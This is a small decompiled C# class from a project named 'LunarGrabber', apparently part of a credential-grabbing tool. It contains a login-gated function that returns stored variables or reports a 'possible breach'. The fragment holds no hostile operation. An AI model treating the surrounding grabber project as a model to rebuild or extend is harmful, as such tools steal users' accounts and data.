using System;
using System.Collections.Generic;

namespace LunarGrabber
{
	// Token: 0x02000008 RID: 8
	internal class App
	{
		// Token: 0x06000023 RID: 35 RVA: 0x0000319C File Offset: 0x0000139C
		public static string GrabVariable(string name)
		{
			string result;
			try
			{
				if (User.ID != null || User.HWID != null || User.IP != null || !Constants.Breached)
				{
					result = App.Variables[name];
				}
				else
				{
					Constants.Breached = true;
					result = "User is not logged in, possible breach detected!";
				}
			}
			catch
			{
				result = "N/A";
			}
			return result;
		}

		// Token: 0x04000018 RID: 24
		public static string Error = null;

		// Token: 0x04000019 RID: 25
		public static Dictionary<string, string> Variables = new Dictionary<string, string>();
	}
}
